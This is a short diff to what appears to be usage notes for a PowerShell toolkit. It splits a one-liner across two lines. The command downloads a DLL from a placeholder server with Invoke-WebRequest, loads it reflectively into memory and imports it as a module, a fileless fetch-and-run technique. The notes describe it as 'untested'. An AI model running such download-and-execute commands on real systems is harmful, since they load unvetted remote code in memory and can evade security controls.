@@ -11,7 +11,8 @@ $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolki
 Import-Module -Assembly $a
 
 Untested but should work.
-$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
+$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);
+$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
 Import-Module -Assembly $a
 
 ```
